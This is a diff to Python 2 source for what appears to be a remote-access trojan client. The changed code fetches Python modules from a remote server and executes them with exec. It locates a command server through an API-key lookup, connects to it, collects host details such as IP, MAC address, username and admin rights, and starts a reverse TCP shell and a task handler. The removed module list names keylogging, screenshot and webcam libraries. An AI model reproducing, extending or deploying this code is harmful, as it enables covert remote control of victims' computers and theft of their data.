@@ -6,7 +6,7 @@ Copyright (c) 2018 Daniel Vega-Myhre
 """
 from __future__ import print_function
 
-# Modules
+# Standard Library
 
 import os
 import sys
@@ -15,7 +15,6 @@ import time
 import json
 import zlib
 import uuid
-import numpy
 import Queue
 import base64
 import ctypes
@@ -35,29 +34,30 @@ import cStringIO
 import contextlib
 import subprocess
 import collections
-import Crypto.Util
-import Crypto.Cipher.AES
 import logging.handlers
-
 
 try:
     from urllib2 import urlopen
 except ImportError:
     from urllib.request import urlopen
 
+# Remote Imports
 
+with remote_repo(['Crypto', 'Crypto.Util', 'Crypto.Cipher.AES', 'Crypto.Hash.MD5', 'Cryptodome', 'win32com.client'], base_url):
+    for module in ['Crypto', 'Crypto.Util', 'Crypto.Cipher.AES', 'Crypto.Hash.MD5', 'Cryptodome', 'win32com.client']:
+        try:
+            exec "import %s" % module in globals()
+            Util.debug("%s imported successfully." % module)
+        except ImportError:
+            Util.debug("%s import failed." % module)
 
 # Globals
-
-
 
 _debug  = True
 _abort  = False
 
-
         
 # Decorators
-
 
 
 def config(*arg, **options):
@@ -88,9 +88,7 @@ def threaded(function):
     return _threaded
 
 
-
 # Functions
-
 
 
 def __create_github_url(username, repo, branch='master'):
@@ -171,9 +169,7 @@ def github_repo(username=None, repo=None, module=None, branch=None, commit=None)
     remove_remote_repo(url)
 
 
-
 # Classes
-
 
 
 class Importer(object):
@@ -190,40 +186,27 @@ class Importer(object):
 
 
     def find_module(self, fullname, path=None):
-        Util.debug("FINDER=================")
-        Util.debug("[!] Searching %s" % fullname)
-        Util.debug("[!] Path is %s" % path)
-        Util.debug("[@] Checking if in declared remote module names >")
         if fullname.split('.')[0] not in self.module_names:
-            Util.debug("[-] Not found!")
             return None
-        Util.debug("[@] Checking if built-in >")
         try:
             loader = imp.find_module(fullname, path)
             if loader:
                 return None
-                Util.debug("[-] Found locally!")
         except ImportError:
             pass
-        Util.debug("[@] Checking if it is name repetition >")
         if fullname.split('.').count(fullname.split('.')[-1]) > 1:
-            Util.debug("[-] Found locally!")
             return None
-        Util.debug("[*]Module/Package '%s' can be loaded!" % fullname)
         return self
 
 
     def load_module(self, name):
         imp.acquire_lock()
-        Util.debug("LOADER=================")
         Util.debug("[+] Loading %s" % name)
         if name in sys.modules:
-            Util.debug('[+] Module "%s" already loaded!' % name)
             imp.release_lock()
             return sys.modules[name]
         if name.split('.')[-1] in sys.modules:
             imp.release_lock()
-            Util.debug('[+] Module "%s" loaded as a top level module!' % name)
             return sys.modules[name.split('.')[-1]]
         module_url = self.base_url + '%s.py' % name.replace('.', '/')
         package_url = self.base_url + '%s/__init__.py' % name.replace('.', '/')
@@ -231,7 +214,6 @@ class Importer(object):
         final_url = None
         final_src = None
         try:
-            Util.debug("[+] Trying to import as package from: '%s'" % package_url)
             package_src = None
             if self.non_source :    
                 package_src = self.__fetch_compiled(package_url)
@@ -241,10 +223,8 @@ class Importer(object):
             final_url = package_url
         except IOError as e:
             package_src = None
-            Util.debug("[-] '%s' is not a package:" % name)
         if final_src == None:
             try:
-                Util.debug("[+] Trying to import as module from: '%s'" % module_url)
                 module_src = None
                 if self.non_source :    
                     module_src = self.__fetch_compiled(module_url)
@@ -254,11 +234,8 @@ class Importer(object):
                 final_url = module_url
             except IOError as e:
                 module_src = None
-                Util.debug("[-] '%s' is not a module:" % name)
-                Util.debug("[!] '%s' not found in HTTP repository. Moving to next Finder." % name)
                 imp.release_lock()
                 return None
-        Util.debug("[+] Importing '%s'" % name)
         mod = imp.new_module(name)
         mod.__loader__ = self
         mod.__file__ = final_url
@@ -267,7 +244,6 @@ class Importer(object):
         else:
             mod.__package__ = name.split('.')[0]
         mod.__path__ = ['/'.join(mod.__file__.split('/')[:-1]) + '/']
-        Util.debug("[+] Ready to execute '%s' code" % name)
         sys.modules[name] = mod
         exec(final_src, mod.__dict__)
         Util.debug("[+] '%s' imported succesfully!" % name)
@@ -602,16 +578,16 @@ class Util():
 
 
     @staticmethod
-    def import_modules(base_url='$REPO$', modules=['configparser', 'Crypto', 'Cryptodome', 'cv2', 'httpimport', 'mss', 'numpy', 'pyHook', 'PyInstaller', 'pyminifier', 'pythoncom', 'pywin32', 'pyxhook', 'requests', 'twilio', 'uuid', 'win32', 'win32com', 'wmi', 'Xlib']):
+    def import_modules(base_url='http://localhost:8000'):
         """
         import modules remotely without installing from github or a server 
         """
         imports = {}
-        with remote_repo(modules, base_url):
-            for module in modules:
+        with remote_repo(__modules__, base_url):
+            for module in __modules__:
                 try:
                     exec "import %s" % module in globals()
-                    imports[module] = globals()[module]
+                    imports[module] = globals().get(module)
                     Util.debug("%s imported successfully." % module)
                 except ImportError:
                     Util.debug("%s import failed." % module)
@@ -619,22 +595,22 @@ class Util():
     
 
     @staticmethod
-    def find_server(url, api):
+    def find_server(api_url, api_key):
         """
         Use API Key to dynamically locate an active server
         """
         host, port  = 'localhost', 1337
         try:
-            if url.startswith('http'):
-                req         = urllib2.Request(url)
-                req.headers = {'API-Key': api}
+            if api_url.startswith('http'):
+                req         = urllib2.Request(api_url)
+                req.headers = {'API-Key': api_key}
                 response    = urllib2.urlopen(req).read()
                 try:
                     host = json.loads(response)['main_ip']
                 except: pass
             else:
-                Util.debug("Error: invalid URL '{}'".format(url))
-            if not ipv4(host):
+                Util.debug("Error: invalid URL '{}'".format(api_url))
+            if not Util.ipv4(host):
                 Util.debug("Error: invalid target host '{}'".format(host))
                 host = 'localhost'
         except Exception as e:
@@ -821,7 +797,7 @@ class Shell():
     global _debug
     global _abort
 
-    def __init__(self):
+    def __init__(self, api=None):
         self.session    = {}
         self.info       = self.system_info()
         self.commands   = {cmd: {'method': getattr(self, cmd), 'platforms': getattr(Shell, cmd).platforms, 'usage': getattr(Shell, cmd).usage, 'description': getattr(Shell, cmd).func_doc.strip().rstrip()} for cmd in vars(Shell) if hasattr(vars(Shell)[cmd], 'command') if getattr(vars(Shell)[cmd], 'command')}
@@ -830,6 +806,7 @@ class Shell():
         self._modules   = Util.import_modules()
         self._jobs      = Queue.Queue()
         self._workers   = {}
+        self._api       = api
 
 
     @threaded
@@ -930,12 +907,12 @@ class Shell():
             Util.debug("{} error: {}".format(self.pwd.func_name, str(e)))
 
 
-    def run(self, **kwargs):
+    def run(self):
         """
         run client startup routine
         """
         try:
-            if self.connect(**kwargs):
+            if self.connect():
                 self._workers['tasks'] = self._task_handler()
                 self._workers['shell'] = self.reverse_tcp_shell()
             else:
@@ -1233,14 +1210,14 @@ class Shell():
         return result
 
 
-    def connect(self, **kwargs):
+    def connect(self):
         """
         connect to server and start new session
         """
         try:
             host, port = 'localhost', 1337
-            if kwargs.get('config'):
-                url,  api  = Security.decrypt_xor(str(kwargs.get('config')), base64.b64decode('$KEY$')).splitlines()
+            if self._api:
+                url,  api  = urllib.urlopen(self._api).read().splitlines()
                 host, port = Util.find_server(url, api)
             self._socket.connect((host, port))
             self._socket.setblocking(True)
@@ -1350,7 +1327,7 @@ class Shell():
         try:
             mode, _, target = str(args).partition(' ')
             if target:
-                if not ipv4(target):
+                if not Util.ipv4(target):
                     return "Error: invalid IP address '%s'" % target
             else:
                 target = socket.gethostbyname(socket.gethostname())
@@ -1510,7 +1487,7 @@ class Shell():
         """
         info = {}
         for func in ['public_ip', 'local_ip', 'platform', 'mac_address', 'architecture', 'username', 'administrator', 'device']:
-            if hasattr(UTil, func):
+            if hasattr(Util, func):
                 try:
                     info[func] = getattr(Util, func)()
                 except Exception as e:
